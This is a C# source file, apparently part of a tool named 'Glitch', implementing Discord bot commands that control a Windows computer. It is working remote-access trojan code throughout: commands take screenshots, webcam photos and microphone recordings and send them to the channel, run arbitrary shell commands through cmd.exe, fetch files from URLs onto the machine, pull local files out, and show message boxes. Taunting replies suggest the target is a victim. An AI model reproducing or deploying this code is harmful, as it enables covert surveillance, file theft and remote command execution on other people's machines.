using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Discord.Commands;
using ImageFormat = System.Drawing.Imaging.ImageFormat;
using System.Net;
using NAudio.Wave;

namespace Glitch.Desktop.Modules
{
    // Modules must be public and inherit from an IModuleBase
    public class PublicModule : ModuleBase<SocketCommandContext>
    {
        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern int mciSendString(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);
        [DllImport("User32.dll", CharSet = CharSet.Unicode)]
        public static extern int MessageBox(IntPtr h, string m, string c, int type);
        [Command("screenshot")]
        public async Task ScreenshotAsync()
        {
            int screenWidth = Screen.PrimaryScreen.Bounds.Width;
            int screenHeight = Screen.PrimaryScreen.Bounds.Height;
            using (Bitmap bmp = Fun.Capture(screenWidth, screenHeight))
            {
                using (MemoryStream stream = new MemoryStream())
                {
                    bmp.Save(stream, ImageFormat.Png);
                    stream.Seek(0, SeekOrigin.Begin);
                    await Context.Channel.SendFileAsync(stream, "screenshot.png");
                }
            }
        }
        [Command("camlist")]
        public async Task CamListAsync()
        {
            string d = ",";
            if (string.Join(d, Webcam.ListDevices()) != "")
            {
                string listdevices = string.Join(d, Webcam.ListDevices());
                await ReplyAsync(listdevices);
            } else
            {
                string listdevices = "No camera for you today, little boy.";
                await ReplyAsync(listdevices);
            }

        }
        [Command("cam")]
        public async Task CamAsync(int index = 0)
        {
            string d = ",";
            if (string.Join(d, Webcam.ListDevices()) != "")
            {
                var _stream = await Webcam.MakePhoto(index);
                _stream.Seek(0, SeekOrigin.Begin);
                await Context.Channel.SendFileAsync(_stream, "screenshot.png");
            } else
            {
                await ReplyAsync("No camera for you today, little boy.");
            }
        }
        [Command("shell")]
        public async Task ShellAsync(string args)
        {
            // Start the child process.
            Process p = new Process();
            // Redirect the output stream of the child process.
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/C" + args;
            p.Start();
            // Do not wait for the child process to exit before
            // reading to the end of its redirected stream.
            // p.WaitForExit();
            // Read the output stream first and then wait.
            string output = "```\n" + p.StandardOutput.ReadToEnd() + "\n```";
            p.WaitForExit();
            await ReplyAsync(output);
        }
        [Command("upload")]
        public async Task FileUploadAsync(string url, string path)
        {
            using (var client = new WebClient())
            {
                client.DownloadFile(url, path);
                await ReplyAsync("Succesfully downloaded the file!");
            }
        }
        [Command("download")]
        public async Task FileDownloadAsync(string path)
        {
            await Context.Channel.SendFileAsync(path, "File request");
        }
        [Command("sound")]
        public async Task SoundPlayAsync(string url)
        {
            WMPLib.WindowsMediaPlayer wplayer = new WMPLib.WindowsMediaPlayer();

            wplayer.URL = url;
            wplayer.controls.play();
            await ReplyAsync("Playing the sound!");
        }
        [Command("record")]
        public async Task RecordAsync(int time)
        {
            WaveInEvent waveInStream;
            WaveFileWriter writer;

            waveInStream = new WaveInEvent();
            writer = new WaveFileWriter("C:/Users/Public/Glitch/Temp/result.wav", waveInStream.WaveFormat);
            int time2 = time += 1000;
            waveInStream.DataAvailable += new EventHandler<WaveInEventArgs>(waveInStream_DataAvailable);
            waveInStream.StartRecording();
            await Task.Delay(time2);
            waveInStream.StopRecording();
            waveInStream.Dispose();
            waveInStream = null;
            writer.Close();
            writer = null;
            await Context.Channel.SendFileAsync("C:/Users/public/Glitch/Temp/result.wav");
            File.Delete("C:/Users/Public/Glitch/Temp/result.wav");
            void waveInStream_DataAvailable(object sender, WaveInEventArgs e)
            {
                writer.Write(e.Buffer, 0, e.BytesRecorded);
            }
        }
        [Command("microlist")]
        public async Task MicroListAsync()
        {
            int waveInDevices = WaveIn.DeviceCount;
            if (WaveIn.DeviceCount == 0)
            {
                await ReplyAsync("No microphones!");
            }
            else
            {
                for (int waveInDevice = 0; waveInDevice < waveInDevices; waveInDevice++)
                {
                    WaveInCapabilities deviceInfo = WaveIn.GetCapabilities(waveInDevice);
                    await ReplyAsync($"Device {waveInDevice}: {deviceInfo.ProductName}, {deviceInfo.Channels} channels");
                }
            }
        }
        [Command("messagebox")]
        public async Task MessageBoxAsync(string name, string value)
        {
            MessageBox((IntPtr)0, value, name, 0);
            await ReplyAsync("User closed the message box!");
        }

    }
}
